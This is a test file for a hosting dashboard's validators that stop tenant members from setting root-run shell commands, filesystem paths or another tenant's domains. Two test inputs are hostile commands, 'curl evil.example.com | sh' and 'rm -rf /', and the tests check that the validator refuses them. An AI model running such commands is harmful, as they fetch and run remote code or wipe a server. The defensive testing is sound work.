import { describe, expect, it } from 'bun:test'
import {
  ADMIN_ONLY_SITE_FIELDS,
  checkMemberSiteFields,
  checkRouteConflict,
  MEMBER_EDITABLE_SITE_FIELDS,
} from './dashboard-site-settings'

describe('checkMemberSiteFields', () => {
  it('allows a member their own site settings', () => {
    expect(checkMemberSiteFields({ name: 'blog', ssl: true }).ok).toBe(true)
    expect(checkMemberSiteFields({ name: 'blog', env: { API_URL: 'x' } }).ok).toBe(true)
    expect(checkMemberSiteFields({ name: 'blog', redirects: { '/old': '/new' } }).ok).toBe(true)
    expect(checkMemberSiteFields({ name: 'blog', domain: 'blog.example.com', path: '/' }).ok).toBe(true)
  })

  /**
   * The important one: build and start are shell commands run on the box as
   * root at deploy time. A member who could set them would own the server and
   * every other tenant's site on it.
   */
  it('refuses the shell-command fields', () => {
    for (const field of ['build', 'start']) {
      const result = checkMemberSiteFields({ name: 'blog', [field]: 'curl evil.example.com | sh' })
      expect(result.ok).toBe(false)
      expect(result.error).toContain('shell command')
    }
  })

  it("refuses root, which would serve another tenant's files", () => {
    const result = checkMemberSiteFields({ name: 'blog', root: '/var/www/other-tenant' })
    expect(result.ok).toBe(false)
    expect(result.error).toContain('filesystem path')
  })

  it('refuses the runtime and port fields', () => {
    for (const field of ['port', 'type', 'php'])
      expect(checkMemberSiteFields({ name: 'blog', [field]: 'x' }).ok).toBe(false)
  })

  it('refuses the whole request when it mixes safe and forbidden fields', () => {
    // Applying only the safe subset would silently drop `start` while
    // reporting success.
    const result = checkMemberSiteFields({ name: 'blog', ssl: true, start: 'rm -rf /' })
    expect(result.ok).toBe(false)
    expect(result.error).toContain('start')
  })

  it('is an allowlist: an unknown field is refused', () => {
    expect(checkMemberSiteFields({ name: 'blog', somethingNew: 'x' }).ok).toBe(false)
  })

  it('ignores fields explicitly set to undefined', () => {
    expect(checkMemberSiteFields({ name: 'blog', ssl: true, start: undefined }).ok).toBe(true)
  })

  it('keeps the two field sets disjoint', () => {
    for (const field of Object.keys(ADMIN_ONLY_SITE_FIELDS)) expect(MEMBER_EDITABLE_SITE_FIELDS.has(field)).toBe(false)
  })
})

describe('checkRouteConflict', () => {
  const sites = {
    blog: { domain: 'blog.example.com', path: '/' },
    marketing: { domain: 'example.com', path: '/', aliases: ['www.example.com'] },
    docs: { domain: 'example.com', path: '/docs' },
  }
  const ownSites = ['blog']
  const check = (body: Record<string, any>): ReturnType<typeof checkRouteConflict> =>
    checkRouteConflict({ siteName: 'blog', body, sites, ownSites })

  it('allows a host nobody serves', () => {
    expect(check({ domain: 'new.example.com' }).ok).toBe(true)
  })

  it("refuses claiming another tenant's domain", () => {
    const result = check({ domain: 'example.com' })
    expect(result.ok).toBe(false)
    expect(result.error).toContain('example.com')
  })

  it("refuses claiming another tenant's alias", () => {
    expect(check({ domain: 'www.example.com' }).ok).toBe(false)
  })

  it("refuses claiming another tenant's host via aliases", () => {
    expect(check({ aliases: ['www.example.com'] }).ok).toBe(false)
  })

  it('never names the other site in the error, which would leak a tenant', () => {
    const result = check({ domain: 'example.com' })
    expect(result.error).not.toContain('marketing')
  })

  it('normalizes host case and trailing dots', () => {
    expect(check({ domain: 'EXAMPLE.COM' }).ok).toBe(false)
    expect(check({ domain: 'example.com.' }).ok).toBe(false)
    expect(check({ domain: '  example.com  ' }).ok).toBe(false)
  })

  it('allows the same host on a non-overlapping path', () => {
    // example.com/docs is taken, but example.com/blog is free.
    expect(check({ domain: 'example.com', path: '/blog' }).ok).toBe(true)
  })

  it('refuses the same host on the same path, normalized', () => {
    expect(check({ domain: 'example.com', path: '/docs/' }).ok).toBe(false)
    expect(check({ domain: 'example.com', path: 'docs' }).ok).toBe(false)
  })

  it('allows a conflict with a site the editor also owns', () => {
    const result = checkRouteConflict({
      siteName: 'blog',
      body: { domain: 'example.com' },
      sites,
      ownSites: ['blog', 'marketing', 'docs'],
    })
    expect(result.ok).toBe(true)
  })

  it('is a no-op when routing is not being changed', () => {
    expect(check({ ssl: true }).ok).toBe(true)
    expect(check({}).ok).toBe(true)
  })

  it("uses the site's current path when the change omits one", () => {
    // blog is at '/', so claiming example.com collides with marketing at '/'.
    expect(check({ domain: 'example.com' }).ok).toBe(false)
  })
})
